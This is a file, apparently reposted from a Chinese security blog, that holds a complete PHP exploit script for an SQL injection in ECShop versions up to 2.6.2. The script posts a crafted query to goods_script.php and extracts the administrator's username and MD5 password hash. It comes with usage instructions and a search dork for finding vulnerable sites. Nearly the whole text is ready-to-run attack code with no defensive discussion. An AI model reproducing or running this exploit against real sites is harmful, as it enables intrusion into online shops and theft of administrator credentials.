@@ -1,0 +1,78 @@
+ECShop注射漏洞
+
+
+EXP：
+
+#!/usr/bin/php
+
+print_r('
++---------------------------------------------------------------------------+
+ECShop <= v2.6.2 SQL injection / admin credentials disclosure exploit
+by puret_t
+mail: puretot at gmail dot com
+team: http://bbs.wolvez.org
+dork: "Powered by ECShop"
++---------------------------------------------------------------------------+
+');
+/**
+ * works with register_globals = On
+ */
+if ($argc < 3) {
+    print_r('
++---------------------------------------------------------------------------+
+Usage: php '.$argv[0].' host path
+host:      target server (ip/hostname)
+path:      path to ecshop
+Example:
+php '.$argv[0].' localhost /ecshop/
++---------------------------------------------------------------------------+
+');
+exit;
+}
+
+error_reporting(7);
+ini_set('max_execution_time', 0);
+
+$host = $argv[1];
+$path = $argv[2];
+
+$resp = send();
+preg_match('#href="([\S]+):([a-z0-9]{32})"#', $resp, $hash);
+
+if ($hash)
+    exit("Expoilt Success!\nadmin:\t$hash[1]\nPassword(md5):\t$hash[2]\n");
+else
+    exit("Exploit Failed!\n");
+
+function send()
+{
+    global $host, $path;
+
+    $cmd = 'sql=SELECT CONCAT(user_name,0x3a,password) as goods_id FROM ecs_admin_user WHERE action_list=0x'.bin2hex('all').' LIMIT 1#';
+
+    $data = "POST ".$path."goods_script.php?type=".time()."  HTTP/1.1\r\n";
+    $data .= "Accept: */*\r\n";
+    $data .= "Accept-Language: zh-cn\r\n";
+    $data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+    $data .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
+    $data .= "Host: $host\r\n";
+    $data .= "Content-Length: ".strlen($cmd)."\r\n";
+    $data .= "Connection: Close\r\n\r\n";
+    $data .= $cmd;
+
+    $fp = fsockopen($host, 80);
+    fputs($fp, $data);
+
+    $resp = '';
+
+    while ($fp && !feof($fp))
+        $resp .= fread($fp, 1024);
+
+    return $resp;
+}
+
+?>
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/135.html 
+
+
+
